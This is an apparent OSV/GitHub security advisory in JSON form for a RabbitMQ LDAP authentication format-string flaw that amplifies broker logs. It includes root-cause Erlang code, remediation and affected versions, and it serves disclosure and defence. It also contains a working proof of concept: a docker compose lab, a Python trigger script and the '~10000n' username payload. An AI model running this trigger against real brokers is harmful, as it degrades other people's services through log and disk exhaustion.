@@ -1,0 +1,111 @@
+{
+  "modified": "2026-10-25T16:28:08Z",
+  "published": "2026-10-25T16:28:08Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-3wxh-g236-vm46",
+  "details": "### Summary\r\n\r\nAn unauthenticated client can amplify RabbitMQ's broker logs by sending a failed AMQP PLAIN login when `rabbitmq_auth_backend_ldap` is enabled with a `user_dn_pattern` containing `${username}`.\r\n\r\nAfter OpenLDAP rejects the bind, the LDAP backend returns the constructed user DN as the format-string element of `{refused, Format, Args}`. RabbitMQ's core authentication path then passes that attacker-influenced DN to Erlang formatting functions. A short username such as `~10000n` expands into 10,000 newlines at each of two refusal sinks.\r\n\r\nThis is not an authentication bypass, an LDAP protocol flaw, or remote code execution. The demonstrated impact is unauthenticated availability degradation through log, disk, formatting, and per-connection memory amplification.\r\n\r\n### Environment and affected versions\r\n\r\nThe end-to-end validation used:\r\n\r\n- A RabbitMQ source build on Erlang 27.3.4.17\r\n- An isolated AMQP listener\r\n- The bundled `rabbitmq_auth_backend_ldap` plugin\r\n- A real OpenLDAP service\r\n- `user_dn_pattern = cn=${username},dc=dast,dc=local`\r\n\r\nThe complete LDAP-to-format chain was separately confirmed in RabbitMQ tags `v3.13.7`, `v4.0.9`, `v4.1.8`, `v4.2.9`, and `v4.3.6`, and on current `main`. No fixed release was identified. These are verified affected snapshots; an exact first affected release was not established.\r\n\r\n### Workarounds\r\n\r\nDisable the LDAP plugin and switch to another authN backend.\r\n\r\n### Root cause\r\n\r\nIn RabbitMQ 4.3.6, `with_login/5` in `deps/rabbitmq_auth_backend_ldap/src/rabbit_auth_backend_ldap.erl` returns the rejected bind DN as a format string:\r\n\r\n```erlang\r\n{error, invalidCredentials} -\u003e\r\n    ?L1(\"bind returned \\\"invalid credentials\\\": ~ts\",\r\n        [scrub_dn(UserDN, env(log))]),\r\n    {refused, UserDN, []};\r\n```\r\n\r\n`check_user_login/3` in `deps/rabbit/src/rabbit_access_control.erl` formats it for the authentication warning:\r\n\r\n```erlang\r\n{refused, _, Msg, Args} -\u003e\r\n    ?LOG_WARNING(\"User '~ts' failed to authenticate: ~ts\",\r\n                 [Username, rabbit_misc:format(Msg, Args)],\r\n                 #{domain =\u003e ?RMQLOG_DOMAIN_USER})\r\n```\r\n\r\n`auth_fail/5` in `deps/rabbit/src/rabbit_reader.erl` formats the same value for the authentication event and protocol error:\r\n\r\n```erlang\r\nnotify_auth_result(Username, user_authentication_failure,\r\n  [{error, rabbit_misc:format(Msg, Args)}], State),\r\nAmqpError = rabbit_misc:amqp_error(\r\n              access_refused, \"~ts login refused: ~ts\",\r\n              [AuthName, io_lib:format(Msg, Args)], none),\r\n```\r\n\r\nRFC 4514 DN escaping does not remove `~`, so Erlang interprets `~10000n` as a no-argument newline directive with field width 10,000.\r\n\r\n### Demonstrated impact\r\n\r\nOne invalid login with username `~10000n` changed the broker log from 139,235 bytes to 1,199,691 bytes. The 1,060,456-byte increase contained 20,004 lines. The warning and subsequent AMQP error each contained 10,000 attacker-generated newlines, and the logger prefixed each line with metadata.\r\n\r\nAn ordinary invalid username did not cause comparable expansion. A `~1000n` control produced a 106,455-byte increase, confirming that output scales with the field width. The client received the normal `ACCESS_REFUSED` response in every case.\r\n\r\nWidths of 100,000 and 1,000,000 exceeded the connection process's heap allowance before a full amplified message reached the log. Those trials temporarily increased broker RSS by approximately 11 MiB and 14 MiB. They did not demonstrate a broker-wide crash or a full-width log write, so neither is claimed.\r\n\r\nRepeated stable-width requests can consume log storage and logging throughput at a large amplification ratio. No confidentiality impact was observed. The CVSS vector uses `AT:P` because the LDAP plugin and username-based DN pattern must be configured.\r\n\r\n### Proof of concept\r\n\r\n**Warning:** run this only in a disposable environment with adequate log space. The trigger deliberately amplifies logs. Do not increase the field width or repeat it against a shared broker.\r\n\r\nCreate `compose.yaml`:\r\n\r\n```yaml\r\nservices:\r\n  openldap:\r\n    image: osixia/openldap:1.5.0\r\n    hostname: openldap\r\n    environment:\r\n      LDAP_ORGANISATION: RabbitMQ PoC\r\n      LDAP_DOMAIN: dast.local\r\n      LDAP_ADMIN_PASSWORD: admin\r\n    healthcheck:\r\n      test: [\"CMD\", \"ldapsearch\", \"-x\", \"-H\", \"ldap://localhost:389\", \"-b\", \"dc=dast,dc=local\"]\r\n      interval: 5s\r\n      timeout: 3s\r\n      retries: 20\r\n\r\n  rabbitmq:\r\n    image: rabbitmq:4.3.6\r\n    hostname: rabbitmq\r\n    depends_on:\r\n      openldap:\r\n        condition: service_healthy\r\n    volumes:\r\n      - ./rabbitmq.conf:/etc/rabbitmq/rabbitmq.conf:ro\r\n      - ./enabled_plugins:/etc/rabbitmq/enabled_plugins:ro\r\n    ports:\r\n      - \"127.0.0.1:5673:5673\"\r\n    healthcheck:\r\n      test: [\"CMD\", \"rabbitmq-diagnostics\", \"-q\", \"ping\"]\r\n      interval: 5s\r\n      timeout: 5s\r\n      retries: 30\r\n```\r\n\r\nCreate `rabbitmq.conf`:\r\n\r\n```ini\r\nlisteners.tcp.default = 5673\r\nloopback_users.guest = false\r\n\r\nauth_backends.1 = ldap\r\nauth_ldap.servers.1 = openldap\r\nauth_ldap.port = 389\r\nauth_ldap.use_ssl = false\r\nauth_ldap.user_dn_pattern = cn=${username},dc=dast,dc=local\r\nauth_ldap.log = false\r\n```\r\n\r\nCreate `enabled_plugins`:\r\n\r\n```erlang\r\n[rabbitmq_auth_backend_ldap].\r\n```\r\n\r\nInstall Pika 1.3.2 and save the following as `trigger.py`:\r\n\r\n```python\r\n#!/usr/bin/env python3\r\nimport argparse\r\n\r\nimport pika\r\n\r\n\r\ndef parse_args():\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"127.0.0.1\")\r\n    parser.add_argument(\"--port\", type=int, default=5673)\r\n    parser.add_argument(\"--username\", default=\"~10000n\")\r\n    return parser.parse_args()\r\n\r\n\r\ndef main():\r\n    args = parse_args()\r\n    credentials = pika.PlainCredentials(\r\n        args.username, \"wrong-password\", erase_on_connect=False\r\n    )\r\n    parameters = pika.ConnectionParameters(\r\n        host=args.host,\r\n        port=args.port,\r\n        credentials=credentials,\r\n        connection_attempts=1,\r\n        socket_timeout=5,\r\n        stack_timeout=10,\r\n    )\r\n\r\n    try:\r\n        connection = pika.BlockingConnection(parameters)\r\n    except Exception as exc:\r\n        print(f\"username={args.username!r}\")\r\n        print(f\"result={type(exc).__name__}: {exc}\")\r\n        return 0\r\n\r\n    connection.close()\r\n    print(\"unexpected authentication success\")\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())\r\n```\r\n\r\nStart the disposable services, record the log size, and send one request:\r\n\r\n```sh\r\ndocker compose up -d --wait\r\npython3 -m venv .venv\r\n.venv/bin/pip install 'pika==1.3.2'\r\nbefore=$(docker compose logs --no-color --no-log-prefix rabbitmq | wc -c)\r\n.venv/bin/python trigger.py\r\nafter=$(docker compose logs --no-color --no-log-prefix rabbitmq | wc -c)\r\nprintf 'log delta: %s bytes\\n' \"$((after - before))\"\r\n```\r\n\r\nThe validated request returned:\r\n\r\n```text\r\nusername='~10000n'\r\nresult=ProbableAuthenticationError: ConnectionClosedByBroker: (403) 'ACCESS_REFUSED - Login was refused using authentication mechanism PLAIN. For details see the broker logfile.'\r\n```\r\n\r\nContainer log drivers add framing, so the portable setup's byte count can differ from the 1,060,456-byte broker-file segment measured during validation.\r\n\r\nInspect and remove the environment:\r\n\r\n```sh\r\ndocker compose logs --no-color --no-log-prefix rabbitmq\r\ndocker compose down -v\r\n```\r\n\r\n### Remediation\r\n\r\nDo not put `UserDN` in the format-string position. Return a fixed template, preferably a generic refusal because a scrubbed DN is already available to diagnostic logging:\r\n\r\n```erlang\r\n{error, invalidCredentials} -\u003e\r\n    ?L1(\"bind returned \\\"invalid credentials\\\": ~ts\",\r\n        [scrub_dn(UserDN, env(log))]),\r\n    {refused, \"LDAP bind was refused\", []};\r\n```\r\n\r\nDocument and enforce that `{refused, Format, Args}` requires a trusted `Format`, then audit other authentication backends for request data in that position. Add regression tests for AMQP 0-9-1, AMQP 1.0, and web-dispatch refusals containing `~n`, large field widths, and ordinary tildes. Each test should assert bounded output and a normal authentication rejection.\r\n\r\nCredit: Opensec Intelligence\r\n\r\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.3.0"
+            },
+            {
+              "fixed": "4.3.7"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "rabbitmq",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.2.0"
+            },
+            {
+              "fixed": "4.2.12"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "rabbitmq",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.1.0"
+            },
+            {
+              "fixed": "4.1.17"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "rabbitmq",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.13.0"
+            },
+            {
+              "fixed": "3.13.21"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "rabbitmq",
+        "source_package": "rabbitmq-server"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-3wxh-g236-vm46"
+    }
+  ]
+}
